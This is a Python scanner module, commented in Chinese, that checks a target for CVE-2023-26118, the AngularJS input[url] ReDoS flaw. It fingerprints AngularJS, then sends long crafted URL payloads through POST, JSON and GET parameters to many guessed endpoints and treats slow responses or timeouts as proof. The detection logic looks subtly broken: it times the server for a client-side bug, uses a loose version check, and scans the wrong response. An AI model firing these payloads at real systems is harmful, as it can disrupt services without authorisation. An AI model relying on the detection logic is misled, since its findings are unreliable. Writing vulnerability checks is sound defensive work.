"""
CVE-2023-26118 Vulnerability Detection Script
AngularJS input[url] ReDoS - CVSS 5.3 (Medium)
HeroDevs Vulnerability Directory - 最佳驗證路徑
影響版本: AngularJS ≥ 1.4.9
"""

import requests
import time
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2023-26118 弱點
    AngularJS input[url] 正規表達式拒絕服務攻擊
    最佳驗證路徑：測試 URL 驗證的災難性回溯
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2023-26118: AngularJS input[url] ReDoS 弱點，惡意 URL 模式導致正規表達式災難性回溯，可造成應用程式凍結',
        'remediation': '更新到 AngularJS NES 1.9.1 或 1.5.17，實施 URL 輸入長度限制 (<1000字符) 和預驗證機制'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2023-26118 input[url] ReDoS 弱點...")
        
        # Step 1: 檢測 AngularJS 和 URL 輸入使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller',
            'angular.module'
        ]
        
        url_input_indicators = [
            'type="url"',
            'input[type=url]',
            'ng-model',
            'url validation',
            'ng-pattern.*url',
            'validateUrl',
            'URL_REGEXP'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_url_input = any(indicator in response.text.lower() for indicator in url_input_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，URL 輸入檢測: {'是' if uses_url_input else '否'}")
        
        # Step 2: 檢查 AngularJS 版本是否受影響
        version_patterns = [
            r'angular\.version\s*=\s*["\']([0-9.]+)',
            r'angular[.-]([0-9.]+)\.(?:min\.)?js',
            r'AngularJS\s+v?([0-9.]+)'
        ]
        
        detected_version = None
        vulnerable_version = False
        
        for pattern in version_patterns:
            match = re.search(pattern, response.text)
            if match:
                detected_version = match.group(1)
                print(f"      [檢測] 檢測到 AngularJS 版本: {detected_version}")
                
                # 檢查版本是否受影響 (>= 1.4.9)
                version_parts = detected_version.split('.')
                if len(version_parts) >= 2:
                    major = int(version_parts[0])
                    minor = int(version_parts[1])
                    if major > 1 or (major == 1 and minor >= 4):
                        vulnerable_version = True
                        print(f"      [檢測] 版本 {detected_version} 受 CVE-2023-26118 影響")
                break
        
        # Step 3: 構造 CVE-2023-26118 特定 ReDoS 攻擊負載
        # 基於 HeroDevs 技術分析的精確攻擊向量
        url_redos_payloads = [
            {
                'payload': 'http://test.com/' + 'a' * 1000 + '!',
                'description': 'ReDoS payload - 1000 chars + invalid ending',
                'expected_delay': 1.0,
                'severity': 'medium'
            },
            {
                'payload': 'https://example.com/' + 'x' * 1500 + 'invalid',
                'description': 'Extended ReDoS - 1500 chars invalid URL',
                'expected_delay': 2.5,
                'severity': 'high'
            },
            {
                'payload': 'http://domain.com/' + 'b' * 800 + '?' + 'c' * 800 + '#invalid',
                'description': 'Complex URL ReDoS with query and fragment',
                'expected_delay': 2.0,
                'severity': 'high'
            },
            {
                'payload': 'ftp://test.com/path/' + 'd' * 600 + '.file.' + 'e' * 600,
                'description': 'FTP URL with extension ReDoS pattern',
                'expected_delay': 1.5,
                'severity': 'medium'
            }
        ]
        
        # Step 4: 測試 URL 驗證端點
        validation_endpoints = [
            '/api/validate/url',
            '/api/url/check',
            '/api/validate',
            '/validate/url',
            '/api/link/validate',
            '/api/website/check',
            '/url/validate',
            '/check-url',
            '/validate-link'
        ]
        
        general_endpoints = [
            '/api/user',
            '/api/profile',
            '/api/contact',
            '/api/settings',
            '/profile/update',
            '/contact/submit',
            '/user/update'
        ]
        
        all_endpoints = validation_endpoints + general_endpoints
        
        print(f"      [檢測] 開始測試 {len(url_redos_payloads)} 個 ReDoS 負載...")
        
        for endpoint in all_endpoints:
            try:
                # 先檢查端點是否存在
                test_response = session.get(urljoin(target_url, endpoint), timeout=10)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in url_redos_payloads:
                    payload = payload_data['payload']
                    description = payload_data['description']
                    expected_delay = payload_data['expected_delay']
                    severity = payload_data['severity']
                    
                    try:
                        # 測試多種參數名稱
                        test_data = {
                            'url': payload,
                            'website': payload,
                            'homepage': payload,
                            'link': payload,
                            'website_url': payload,
                            'profile_url': payload,
                            'company_url': payload
                        }
                        
                        print(f"      [檢測] 執行 {description}...")
                        
                        # 執行 POST 請求並測量時間
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=test_data,
                            timeout=30  # 30秒超時
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        print(f"      [檢測] URL 驗證耗時: {duration:.2f} 秒")
                        
                        # 判斷是否存在 ReDoS
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 CVE-2023-26118 input[url] ReDoS 弱點！\n\n攻擊詳情:\n- 負載: {description}\n- URL長度: {len(payload)} 字符\n- 處理時間: {duration:.2f} 秒 (預期: {expected_delay:.1f}秒)\n- 嚴重程度: {severity}\n\n這證明了 AngularJS URL 正規表達式發生災難性回溯，攻擊者可利用此弱點造成應用程式拒絕服務。建議立即更新到安全版本並實施輸入長度限制。"
                            return result
                        
                        # 檢查是否因為驗證錯誤但耗時過長
                        if response.status_code >= 400 and duration > 0.8:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 URL 驗證效能問題。{description} 導致驗證失敗但耗時 {duration:.2f} 秒，表明存在正規表達式效能問題，可能受 CVE-2023-26118 影響。"
                            return result
                        
                        # 測試 JSON 格式
                        json_data = {
                            'profile': {'website': payload},
                            'contact': {'url': payload},
                            'validation': {'url': payload},
                            'url': payload
                        }
                        
                        headers = {'Content-Type': 'application/json'}
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=json_data,
                            headers=headers,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 URL ReDoS 弱點 (JSON 格式)。{description} 耗時 {duration:.2f} 秒，超過預期閾值。"
                            return result
                        
                        # 測試 GET 參數
                        get_params = {
                            'url': payload,
                            'validate_url': payload,
                            'check_url': payload
                        }
                        
                        start_time = time.time()
                        
                        response = session.get(
                            urljoin(target_url, endpoint),
                            params=get_params,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 URL ReDoS 弱點 (GET 參數)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                            
                    except requests.exceptions.Timeout:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現嚴重的 CVE-2023-26118 ReDoS 弱點！{description} 導致請求逾時 (>30秒)，證明發生了災難性回溯。這是高風險弱點，可導致應用程式完全無響應。"
                        return result
                    
                    except Exception as e:
                        if "timeout" in str(e).lower() or "read timeout" in str(e).lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 URL ReDoS 弱點。{description} 導致連線逾時，表明正規表達式處理時間過長。"
                            return result
                        # 其他錯誤繼續測試
                        continue
                        
            except Exception as e:
                # 端點測試失敗，繼續下一個
                continue
        
        # Step 5: 分析現有頁面中的 URL 輸入實作
        print("      [檢測] 分析現有頁面的 URL 輸入實作...")
        
        url_input_patterns = [
            r'<input[^>]+type\s*=\s*["\']url["\'][^>]*>',
            r'ng-pattern\s*=\s*["\'][^"\']*url[^"\']*["\']',
            r'ng-model\s*=\s*["\'][^"\']*url[^"\']*["\']',
            r'validateUrl\s*\(',
            r'URL_REGEXP',
            r'input\[type=url\]'
        ]
        
        found_url_inputs = []
        for pattern in url_input_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_url_inputs.extend(matches)
        
        if found_url_inputs:
            print(f"      [檢測] 發現 {len(found_url_inputs)} 個 URL 輸入相關實作")
            
            # 檢查是否有高風險的實作模式
            high_risk_patterns = []
            for input_field in found_url_inputs:
                # 沒有長度限制的 ng-model
                if 'ng-model' in input_field and 'maxlength' not in input_field.lower():
                    high_risk_patterns.append(input_field)
                # 自定義 URL 驗證模式
                elif 'ng-pattern' in input_field and 'url' in input_field.lower():
                    high_risk_patterns.append(input_field)
                # 使用 validateUrl 函數
                elif 'validateurl' in input_field.lower():
                    high_risk_patterns.append(input_field)
            
            if high_risk_patterns and vulnerable_version:
                result['vulnerable'] = True
                result['evidence'] = f"發現高風險 URL 輸入實作，結合易受攻擊的 AngularJS 版本 ({detected_version})。發現 {len(high_risk_patterns)} 個無長度限制的 URL 輸入欄位，可能受 CVE-2023-26118 ReDoS 攻擊影響。建議立即實施輸入驗證和長度限制。"
                return result
        
        # Step 6: 執行輕量級 ReDoS 測試
        print("      [檢測] 執行輕量級 ReDoS 快速檢測...")
        
        lightweight_payload = 'http://test.com/' + 'x' * 300 + 'invalid'
        
        for endpoint in ['/api/validate', '/validate', '/api/user']:
            try:
                start_time = time.time()
                
                response = session.post(
                    urljoin(target_url, endpoint),
                    data={'url': lightweight_payload},
                    timeout=10
                )
                
                end_time = time.time()
                duration = end_time - start_time
                
                if duration > 0.5:  # 500ms 閾值
                    print(f"      [檢測] 在 {endpoint} 檢測到輕微效能問題 ({duration:.2f}s)")
                    if vulnerable_version:
                        result['evidence'] += f" 輕量級測試顯示版本 {detected_version} 存在 URL 驗證效能問題。"
                        
            except:
                continue
        
        # 最終結果
        if vulnerable_version and found_url_inputs:
            result['evidence'] = f"檢測摘要: AngularJS 版本 {detected_version or '未知'} 可能受 CVE-2023-26118 影響。發現 {len(found_url_inputs)} 個 URL 輸入實作。雖未觸發明確的 ReDoS 攻擊，但建議更新到安全版本並實施預防措施。"
        else:
            result['evidence'] = f"完成 CVE-2023-26118 全面檢測。測試了 {len(all_endpoints)} 個端點和 {len(url_redos_payloads)} 個 ReDoS 負載，分析了 {len(found_url_inputs)} 個 URL 輸入實作，未發現明確的 ReDoS 弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result